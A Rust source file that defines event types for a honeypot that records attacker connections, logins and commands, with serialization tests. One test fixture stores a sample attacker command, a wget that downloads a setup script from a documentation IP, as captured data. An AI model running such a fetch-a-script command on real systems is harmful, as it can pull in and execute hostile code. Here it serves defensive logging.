//! Event types for honeypot captures

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use uuid::Uuid;

pub type EventId = Uuid;
pub type SessionId = Uuid;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Protocol {
    Ssh,
    Http,
    Smb,
    Mysql,
    Redis,
}

impl std::fmt::Display for Protocol {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Protocol::Ssh => write!(f, "ssh"),
            Protocol::Http => write!(f, "http"),
            Protocol::Smb => write!(f, "smb"),
            Protocol::Mysql => write!(f, "mysql"),
            Protocol::Redis => write!(f, "redis"),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Low,
    Medium,
    High,
    Critical,
}

#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum EventCategory {
    Connection,
    Authentication,
    Command,
    FileAccess,
    Payload,
    Exploit,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct SourceInfo {
    pub ip: String,
    pub port: u16,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub country_code: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub country_name: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub city: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub asn: Option<u32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub asn_org: Option<String>,
}

impl SourceInfo {
    pub fn new(ip: String, port: u16) -> Self {
        Self {
            ip,
            port,
            country_code: None,
            country_name: None,
            city: None,
            asn: None,
            asn_org: None,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct DestinationInfo {
    pub ip: String,
    pub port: u16,
    pub honeypot_id: String,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Credentials {
    pub username: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub password: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ssh_key: Option<String>,
    pub auth_method: String,
    pub success: bool,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct CommandExecution {
    pub command: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub command_name: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub arguments: Option<Vec<String>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub output: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub working_directory: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct HoneypotEvent {
    pub id: EventId,
    pub session_id: SessionId,
    pub timestamp: DateTime<Utc>,
    pub protocol: Protocol,
    pub category: EventCategory,
    pub severity: Severity,
    pub source: SourceInfo,
    pub destination: DestinationInfo,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub credentials: Option<Credentials>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub command: Option<CommandExecution>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub raw_data: Option<String>,
    #[serde(default)]
    pub metadata: std::collections::HashMap<String, serde_json::Value>,
    #[serde(default)]
    pub tags: Vec<String>,
}

impl HoneypotEvent {
    pub fn new(
        session_id: SessionId,
        protocol: Protocol,
        category: EventCategory,
        source: SourceInfo,
        destination: DestinationInfo,
    ) -> Self {
        Self {
            id: Uuid::new_v4(),
            session_id,
            timestamp: Utc::now(),
            protocol,
            category,
            severity: Severity::Medium,
            source,
            destination,
            credentials: None,
            command: None,
            raw_data: None,
            metadata: std::collections::HashMap::new(),
            tags: Vec::new(),
        }
    }

    pub fn with_severity(mut self, severity: Severity) -> Self {
        self.severity = severity;
        self
    }

    pub fn with_credentials(mut self, credentials: Credentials) -> Self {
        self.credentials = Some(credentials);
        self
    }

    pub fn with_command(mut self, command: CommandExecution) -> Self {
        self.command = Some(command);
        self
    }

    pub fn with_tag(mut self, tag: impl Into<String>) -> Self {
        self.tags.push(tag.into());
        self
    }

    pub fn with_metadata(mut self, key: impl Into<String>, value: serde_json::Value) -> Self {
        self.metadata.insert(key.into(), value);
        self
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_event() -> HoneypotEvent {
        HoneypotEvent::new(
            Uuid::nil(),
            Protocol::Ssh,
            EventCategory::Command,
            SourceInfo::new("203.0.113.10".to_string(), 54321),
            DestinationInfo {
                ip: "10.0.0.5".to_string(),
                port: 2222,
                honeypot_id: "ssh-01".to_string(),
            },
        )
        .with_severity(Severity::High)
        .with_credentials(Credentials {
            username: "root".to_string(),
            password: Some("p@ss\"\nword".to_string()),
            ssh_key: None,
            auth_method: "password".to_string(),
            success: true,
        })
        .with_command(CommandExecution {
            command: "wget http://198.51.100.23/setup.sh".to_string(),
            command_name: Some("wget".to_string()),
            arguments: Some(vec!["http://198.51.100.23/setup.sh".to_string()]),
            output: Some("wget: unable to resolve host address".to_string()),
            working_directory: Some("/root".to_string()),
        })
        .with_tag("shell_command")
    }

    #[test]
    fn event_json_round_trip() {
        let event = sample_event();
        let json = serde_json::to_string(&event).unwrap();
        let parsed: HoneypotEvent = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.id, event.id);
        assert_eq!(parsed.session_id, event.session_id);
        assert_eq!(parsed.protocol, Protocol::Ssh);
        assert_eq!(parsed.category, EventCategory::Command);
        assert_eq!(parsed.severity, Severity::High);
        assert_eq!(parsed.source, event.source);
        assert_eq!(parsed.destination, event.destination);
        assert_eq!(parsed.credentials, event.credentials);
        assert_eq!(parsed.command, event.command);
        assert_eq!(parsed.tags, event.tags);
        assert!(json.contains("\"protocol\":\"ssh\""));
        assert!(json.contains("\"category\":\"command\""));
    }

    #[test]
    fn serialized_event_is_a_single_line() {
        let json = serde_json::to_string(&sample_event()).unwrap();
        assert!(!json.contains('\n'));
        let parsed: HoneypotEvent = serde_json::from_str(&json).unwrap();
        assert_eq!(
            parsed.credentials.unwrap().password.as_deref(),
            Some("p@ss\"\nword")
        );
    }
}
